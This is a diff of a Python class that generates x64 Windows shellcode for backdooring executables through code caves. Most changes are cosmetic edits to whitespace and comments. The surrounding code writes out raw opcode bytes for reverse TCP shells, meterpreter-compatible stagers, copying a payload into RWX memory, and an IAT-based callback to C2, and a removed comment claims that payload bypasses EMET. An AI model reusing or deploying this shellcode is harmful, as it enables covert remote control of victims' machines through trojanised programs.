@@ -70,10 +70,10 @@ class winI64_shellcode():
         return self.shellcode
 
     def clean_caves_stub(self, CavesToFix):
-        stub = ("\x48\x31\xC0"          # xor rax,rax
-                "\x65\x48\x8B\x49\x60"  # mov rcx,QWORD PTR gs:[rcx+0x60]
-                "\x48\x8B\x49\x10"      # mov rcx,QWORD PTR [rcx+0x10]
-                "\x48\x89\xCB"              # mov rbx,rcx
+        stub = ("\x48\x31\xC0"                          # xor rax,rax
+                "\x65\x48\x8B\x49\x60"                  # mov rcx,QWORD PTR gs:[rcx+0x60]
+                "\x48\x8B\x49\x10"                      # mov rcx,QWORD PTR [rcx+0x10]
+                "\x48\x89\xCB"                          # mov rbx,rcx
                 )
         for cave, values in CavesToFix.iteritems():
             stub += "\x48\xbf"                          # mov rdi, value below
@@ -81,7 +81,7 @@ class winI64_shellcode():
             stub += "\x48\x01\xDF"                      # add rdi, rbx
             stub += "\x48\xb9"                          # mov rcx, value below
             stub += struct.pack("<Q", values[1])
-            stub += "\xf3\xaa"                      # REP STOS BYTE PTR ES:[EDI]
+            stub += "\xf3\xaa"                          # REP STOS BYTE PTR ES:[EDI]
         return stub
 
     def reverse_shell_tcp_inline(self, flItms, CavesPicked={}):
@@ -205,10 +205,6 @@ class winI64_shellcode():
            ^^windows/x64/meterpreter/reverse_tcp will work with this
          * http://www.metasploit.com
          * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080,
-         * ReverseConnectRetries=5, ReverseListenerBindPort=0,
-         * ReverseAllowProxy=false, EnableStageEncoding=false,
-         * PrependMigrate=false, EXITFUNC=thread,
-         * InitialAutoRunScript=, AutoRunScript=
          */
          """
 
@@ -236,8 +232,6 @@ class winI64_shellcode():
                             "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                             "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                             "\x49\x89\xe5\x49\xbc\x02\x00"
-                            #"\x1f\x90"
-                            #"\x7f\x00\x00\x01"
                             )
         self.shellcode2 += struct.pack('!H', self.PORT)
         self.shellcode2 += self.pack_ip_addresses()
@@ -389,21 +383,6 @@ class winI64_shellcode():
         self.shellcode1 += ("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                             "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                             "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling
-
-                            #Not Used... :/  Can probably live without..
-                            #exitfunk:
-                            #"\x48\xC7\xC3\xE0\x1D\x2A\x0A"          #   mov rbx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
-                            #"\x68\xa6\x95\xbd\x9d"                  #   push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
-                            #"\xFF\xD5"                              #   call rbp               ; GetVersion(); (AL will = major version and AH will = minor version)
-                            #"\x3C\x06"                              #   cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
-                            #"\x7c\x0a"                              #   jl goodbye       ; Then just call the exit function...
-                            #"\x80\xFB\xE0"                          #   cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
-                            #"\x75\x05"                              #   jne goodbye      ;
-                            #"\x48\xC7\xC3\x47\x13\x72\x6F"          #   mov rbx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
-                            # goodbye:                 ; We now perform the actual call to the exit function
-                            #"\x6A\x00"                              #   push byte 0            ; push the exit function parameter
-                            #"\x53"                                  #   push rbx               ; push the hash of the exit function
-                            #"\xFF\xD5"                              #   call rbp               ; call EXITFUNK( 0 );
 
                             #set_handler:
                             "\x48\x31\xC0"  # xor rax,rax
@@ -951,9 +930,6 @@ class winI64_shellcode():
         """
         Position dependent shellcode that uses API thunks of LoadLibraryA and
         GetProcAddress to find and load APIs for callback to C2.
-        Bypasses EMET 4.1. Idea from Jared DeMott:
-        http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/
-        via @bannedit0 (twitter handle)
         """
         flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress']
 
@@ -1162,7 +1138,7 @@ class winI64_shellcode():
 
     def iat_reverse_tcp_inline_threaded(self, flItms, CavesPicked={}):
         """
-        Completed IAT based payload includes spawning of thread.
+        Complete IAT based payload includes spawning of thread.
         """
 
         flItms['stager'] = True
@@ -1965,7 +1941,7 @@ class winI64_shellcode():
                 self.shellcode2 += "\x41" * 90
 
         self.shellcode2 += self.supplied_shellcode
-        
+
         breakupvar = eat_code_caves(flItms, 0, 1)
 
         #allocate
